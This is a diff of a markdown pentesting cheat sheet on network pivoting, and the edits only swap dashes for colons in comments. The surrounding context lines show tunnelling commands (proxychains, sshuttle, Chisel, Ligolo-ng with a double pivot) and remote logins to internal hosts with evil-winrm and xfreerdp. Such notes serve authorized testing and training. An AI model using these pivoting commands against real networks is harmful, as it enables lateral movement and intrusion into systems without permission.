@@ -9,12 +9,12 @@ draft = false
 ## proxychains Setup
 
 ```bash
-# /etc/proxychains4.conf — add at bottom
+# /etc/proxychains4.conf: add at bottom
 socks5 127.0.0.1 1080   # chisel reverse / ligolo
 socks4 127.0.0.1 9050   # SSH dynamic
 
 # Use with any tool
-proxychains nmap -v -sT -Pn 172.16.5.19    # TCP connect only — no SYN scans
+proxychains nmap -v -sT -Pn 172.16.5.19    # TCP connect only: no SYN scans
 proxychains evil-winrm -i 172.16.5.10 -u admin -p pass
 proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass
 proxychains msfconsole
@@ -73,7 +73,7 @@ ssh -R <pivot-host-ip>:8080:0.0.0.0:8000 user@<pivot-host> -vN
 
 ## sshuttle
 
-Transparent proxy — no proxychains needed.
+Transparent proxy: no proxychains needed.
 
 ```bash
 # Route entire subnet through pivot
@@ -87,7 +87,7 @@ sshuttle -r user@<pivot-host> 172.16.5.0/23 --exclude <pivot-host-ip>
 
 ## Chisel
 
-TCP/UDP tunnel over HTTP/SSH — good through strict firewalls.
+TCP/UDP tunnel over HTTP/SSH: good through strict firewalls.
 
 ### Forward Mode (pivot host as server)
 
@@ -119,7 +119,7 @@ socks5 127.0.0.1 1080
 
 ## Ligolo-ng
 
-Creates a real tun interface — no proxychains needed for most tools.
+Creates a real tun interface: no proxychains needed for most tools.
 
 ### Setup (Attack Host)
 
@@ -144,7 +144,7 @@ chmod +x lin-agent
 ### Activate Tunnel
 
 ```bash
-# In ligolo console — select session, add route, start
+# In ligolo console: select session, add route, start
 ligolo-ng » session
 [Agent: user@pivot] » start
 
@@ -159,10 +159,10 @@ nmap -sV 172.16.5.10
 ### Double Pivot (Ligolo)
 
 ```bash
-# In ligolo console on attacker — add listener to relay second agent
+# In ligolo console on attacker: add listener to relay second agent
 listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
 
-# On second pivot (Windows) — connect back through first pivot
+# On second pivot (Windows): connect back through first pivot
 ./agent.exe -connect <first-pivot-internal-ip>:11601 -ignore-cert
 
 # Add second-hop subnet route
